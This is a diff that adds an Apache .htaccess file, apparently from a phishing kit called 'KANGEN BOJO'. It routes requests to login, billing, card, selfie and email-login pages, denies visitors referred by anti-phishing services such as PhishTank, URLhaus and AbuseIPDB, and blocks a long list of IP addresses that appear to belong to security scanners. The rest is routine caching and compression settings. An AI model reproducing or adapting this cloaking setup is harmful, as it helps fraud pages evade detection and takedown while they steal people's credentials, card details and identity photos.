@@ -1,0 +1,219 @@
+# ================================================================================
+#     KANGEN BOJO ADVANCED WEB SYSTEM
+# ================================================================================
+    
+#     Script Name     : KANGEN BOJO Advanced Web Management System
+#     Version         : V.1
+#     Author          : Kangen Bojo Development Team
+#     Created         : 2025
+#     Last Modified   : November 2025
+
+Options -Indexes
+ServerSignature Off
+
+# Enable rewrite engine
+RewriteEngine on
+
+AddType image/svg+xml .svg .svgz
+AddEncoding gzip .svgz
+
+# Handle clean URLs: rewrite /page to /page.php ONLY for specific pages
+RewriteCond %{REQUEST_FILENAME} !-d 
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^(login|billing|card|selfie|email_login)/?$ $1.php [L,QSA]
+
+# Block direct access to includes folder
+RewriteRule ^includes/ - [F,L]
+
+# Block access to config files
+<FilesMatch "\.php$|\.conf$|\.config$">
+    Deny from all
+</FilesMatch>
+
+# Allow only specific files in root
+<FilesMatch "^(login|billing|card|selfie|index|email_login|admin)\.php$">
+    Allow from all
+</FilesMatch>
+
+# Block anti-phishing services & security scanners
+RewriteCond %{HTTP_REFERER} phishtank [NC,OR]
+RewriteCond %{HTTP_REFERER} urlhaus [NC,OR]
+RewriteCond %{HTTP_REFERER} abuse\.ch [NC,OR]
+RewriteCond %{HTTP_REFERER} securitytrails [NC,OR]
+RewriteCond %{HTTP_REFERER} abuseipdb [NC,OR]
+RewriteCond %{HTTP_REFERER} disq\.us [NC]
+RewriteRule .* 404 [L]
+
+# Security headers
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-XSS-Protection "1; mode=block"
+    Header set X-Frame-Options "SAMEORIGIN"
+    Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+    Header set Referrer-Policy "strict-origin-when-cross-origin"
+    Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self';"
+    Header always unset "X-Powered-By"
+    Header always unset "Server"
+</IfModule>
+
+# Block IPs
+order allow,deny
+deny from 89.207.18.182/22
+deny from 173.194.69.147/22
+deny from 149.3.176.145/22
+deny from 66.235.156.128/22
+deny from 173.194.69.125/22
+deny from 173.194.69.120/22
+deny from 173.194.69.102/22
+deny from 173.194.69.95/22
+deny from 173.194.69.94/22
+deny from 173.194.69.91/22
+deny from 173.0.88.2/22
+deny from 173.0.84.2/22
+deny from 173.0.84.34/22
+deny from 173.0.88.34/22
+deny from 2.20.6.85/22
+deny from 63.245.213.92/22
+deny from 173.194.69.106/22
+deny from 173.194.69.99/22
+deny from 173.194.69.103/22
+deny from 173.194.69.104/22
+deny from 173.194.69.105/22
+deny from 63.245.217.20/22
+deny from 64.62.203.172/22
+deny from 173.194.69.113/22
+deny from 173.194.69.138/22
+deny from 173.194.69.139/22
+deny from 173.194.69.100/22
+deny from 173.194.69.101/22
+deny from 63.245.217.71/22
+deny from 188.112.175.207/22
+deny from 66.235.139.166/22
+deny from 66.235.138.2/22
+deny from 66.235.138.59/22
+deny from 66.235.139.153/22
+deny from 66.235.139.152/22
+deny from 66.235.138.44/22
+deny from 66.235.139.118/22
+deny from 66.235.138.18/22
+deny from 66.235.139.121/22
+deny from 66.235.138.19/22
+deny from 66.235.134.160/22
+deny from 66.235.133.8/22
+deny from 66.235.133.52/22
+deny from 66.235.133.33/22
+deny from 66.235.132.152/22
+deny from 66.235.133.62/22
+deny from 66.235.132.232/22
+deny from 66.235.132.118/22
+deny from 66.235.133.11/22
+deny from 66.235.132.121/22
+deny from 149.20.57.227
+deny from 199.48.147.36
+deny from 37.59.162.218
+deny from 89.122.57.201
+deny from 69.163.205.29
+deny from 74.120.15.150
+deny from 109.163.233.200
+deny from 79.120.86.20
+deny from 31.172.30.4
+deny from 109.65.136.19
+deny from 66.150.14.185
+deny from 50.97.98.130
+deny from 80.237.226.73
+deny from 64.34.184.153
+deny from 66.230.230.230
+deny from 71.165.245.158
+deny from 76.73.56.7
+deny from 77.109.139.87
+deny from 81.218.219.122
+deny from 83.86.110.188
+deny from 83.142.228.14
+deny from 83.249.87.238
+deny from 85.17.92.13
+deny from 85.235.31.248
+deny from 87.118.104.203
+deny from 88.80.28.70
+deny from 88.208.121.151
+deny from 89.253.97.235
+deny from 91.121.170.32
+deny from 94.249.153.47
+deny from 95.143.193.145
+deny from 109.169.29.56
+deny from 109.123.119.163
+deny from 137.56.163.46
+deny from 137.56.163.64
+deny from 173.193.221.28
+deny from 192.251.226.205
+deny from 192.251.226.206
+deny from 199.48.147.35
+deny from 199.48.147.38
+deny from 199.48.147.40
+deny from 199.48.147.41
+deny from 208.66.135.190
+deny from 209.44.114.178
+deny from 209.159.142.164
+deny from 209.159.143.130
+deny from 213.220.233.230
+deny from 8.18.38.105
+deny from 62.141.58.13
+deny from 62.163.180.154
+deny from 77.171.107.207
+deny from 78.47.251.152
+deny from 81.169.155.246
+deny from 82.194.86.135
+deny from 83.163.192.49
+deny from 91.121.152.114
+deny from 91.213.50.235
+deny from 93.167.245.178
+deny from 94.23.215.184
+deny from 174.138.169.218
+deny from 64.34.162.160
+deny from 66.249.9.107
+deny from 66.96.16.32
+deny from 78.107.233.68
+deny from 78.107.237.16
+deny from 83.170.92.9
+deny from 85.214.73.63
+deny from 91.124.187.225
+deny from 194.0.229.54
+deny from 195.43.157.85
+allow from all
+
+<IfModule mod_deflate.c>
+  AddOutputFilterByType DEFLATE text/plain
+  AddOutputFilterByType DEFLATE text/html
+  AddOutputFilterByType DEFLATE text/xml
+  AddOutputFilterByType DEFLATE text/css
+  AddOutputFilterByType DEFLATE text/javascript
+  AddOutputFilterByType DEFLATE application/javascript
+  AddOutputFilterByType DEFLATE application/x-javascript
+  AddOutputFilterByType DEFLATE application/xml
+  AddOutputFilterByType DEFLATE application/xhtml+xml
+  AddOutputFilterByType DEFLATE application/rss+xml
+  AddOutputFilterByType DEFLATE application/json
+  AddOutputFilterByType DEFLATE application/atom+xml
+</IfModule>
+
+
+<IfModule mod_expires.c>
+  ExpiresActive On
+  ExpiresDefault "access plus 1 month"
+
+  ExpiresByType image/jpg "access plus 1 year"
+  ExpiresByType image/jpeg "access plus 1 year"
+  ExpiresByType image/gif "access plus 1 year"
+  ExpiresByType image/png "access plus 1 year"
+  ExpiresByType text/css "access plus 1 month"
+  ExpiresByType text/html "access plus 1 week"
+  ExpiresByType application/pdf "access plus 1 month"
+  ExpiresByType text/javascript "access plus 1 month"
+  ExpiresByType application/x-javascript "access plus 1 month"
+  ExpiresByType application/javascript "access plus 1 month"
+  ExpiresByType application/font-woff2 "access plus 1 year"
+</IfModule>
+
+<IfModule mod_headers.c>
+  Header unset ETag
+</IfModule>
+FileETag None
